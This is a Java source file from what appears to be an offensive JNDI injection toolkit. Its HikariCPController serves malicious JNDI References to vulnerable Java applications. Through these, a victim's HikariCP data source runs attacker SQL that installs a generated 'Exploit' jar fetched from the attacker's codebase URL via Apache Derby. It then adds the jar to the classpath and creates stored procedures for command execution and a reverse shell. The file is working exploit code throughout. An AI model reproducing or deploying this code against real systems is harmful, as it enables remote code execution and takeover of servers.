package map.jndi.controller.database;

import javassist.ClassPool;
import javassist.CtClass;
import map.jndi.Config;
import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.controller.DatabaseController;
import map.jndi.server.WebServer;
import map.jndi.template.DerbyJarTemplate;
import map.jndi.util.JarUtil;
import sun.reflect.generics.reflectiveObjects.NotImplementedException;

import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.util.Properties;

@JNDIController
@JNDIMapping("/HikariCP")
public class HikariCPController extends DatabaseController {
    public Object process(Properties props) {
        Reference ref = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null);
        ref.add(new StringRefAddr("driverClassName", props.getProperty("driver")));
        ref.add(new StringRefAddr("jdbcUrl", props.getProperty("url")));

        if (props.getProperty("sql") != null) {
            ref.add(new StringRefAddr("connectionInitSql", props.getProperty("sql")));
        }

        return ref;
    }

    @JNDIMapping("/Derby/Install/{database}")
    public Properties derbyInstall(String database) {
        // HikariCP 仅能执行单条 SQL 语句
        throw new NotImplementedException();
    }

    @JNDIMapping("/Derby/InstallJar/{database}")
    public Properties derbyInstallJar(String database) throws Exception {
        System.out.println("[Derby] [InstallJar] Database: " + database);

        String url = "jdbc:derby:memory:" + database + ";create=true";

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(DerbyJarTemplate.class.getName());
        clazz.replaceClassName(clazz.getName(), "Exploit");

        String jarName = "Exploit";
        byte[] jarBytes = JarUtil.create(jarName, clazz.toBytecode());
        WebServer.getInstance().serveFile("/" + jarName + ".jar", jarBytes);

        String sql = "CALL SQLJ.INSTALL_JAR('" + Config.codebase + jarName + ".jar', 'APP." + "Exploit" + "', 0)";

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        props.setProperty("sql", sql);

        return props;
    }

    @JNDIMapping("/Derby/AddClassPath/{database}")
    public Properties derbyAddClassPath(String database) {
        System.out.println("[Derby] [AddClassPath] Database: " + database);

        String url = "jdbc:derby:memory:" + database + ";create=true";
        String sql = "CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'APP." + "Exploit" + "')";

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        props.setProperty("sql", sql);

        return props;
    }

    @JNDIMapping("/Derby/CreateCmdProc/{database}")
    public Properties derbyCreateCmdProc(String database) {
        System.out.println("[Derby] [CreateCmdProc] Database: " + database);

        String url = "jdbc:derby:memory:" + database + ";create=true";
        String sql = "CREATE PROCEDURE cmd(IN cmd VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME '" + "Exploit" + ".exec'";

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        props.setProperty("sql", sql);

        return props;
    }

    @JNDIMapping("/Derby/CreateRevProc/{database}")
    public Properties derbyCreateRevProc(String database) {
        System.out.println("[Derby] [CreateRevProc] Database: " + database);

        String url = "jdbc:derby:memory:" + database + ";create=true";
        String sql = "CREATE PROCEDURE rev(IN host VARCHAR(255), IN port VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME '" + "Exploit" + ".rev'";

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        props.setProperty("sql", sql);

        return props;
    }
}
